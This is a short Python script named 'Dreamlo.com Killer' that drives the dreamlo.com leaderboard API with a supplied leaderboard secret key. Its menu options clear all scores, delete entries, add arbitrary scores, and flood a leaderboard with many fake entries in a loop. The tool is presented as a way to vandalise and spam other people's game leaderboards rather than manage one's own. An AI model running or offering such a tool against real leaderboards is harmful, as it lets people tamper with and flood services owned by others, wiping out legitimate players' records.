import requests



secret = ""
secret = input("Enter Leaderboard ID > ")


while True:

	print("""
Dreamlo.com Killer
imalaia3 on github and YT
""")

	

	choice = input("""
[1] Clear All Scores
[2] Add Score
[3] Get Scores
[4] Delete Score
[5] Flood Score
""")


	if choice == "2":
		usr = input("Username > ")
		scr = input("Score > ")
		tip = input("Message (leave blank for none)> ")
		out = requests.get("http://dreamlo.com/lb/" + secret + "/add/" + usr + "/" + scr + "/" + tip)
		print(out.text)



	if choice == "3":
		out = requests.get("http://dreamlo.com/lb/" + secret + "/pipe")
		print(out.text)



	if choice == "4":
		usr = input("Username > ")
		out = requests.get("http://dreamlo.com/lb/" + secret + "/delete/" + usr)
		print(out.text)


	if choice == "1":
		out = requests.get("http://dreamlo.com/lb/" + secret + "/clear/")
		print(out.text)



	if choice == "5":
		usr = input("Username > ")
		scr = input("Score > ")
		tip = input("Message (leave blank for none)> ")
		rep = input("How many times > ")
		for i in range(int(rep)):
			out = requests.get("http://dreamlo.com/lb/" + secret + "/add/" + usr + str(i) + "/" + scr)
			print(out.text)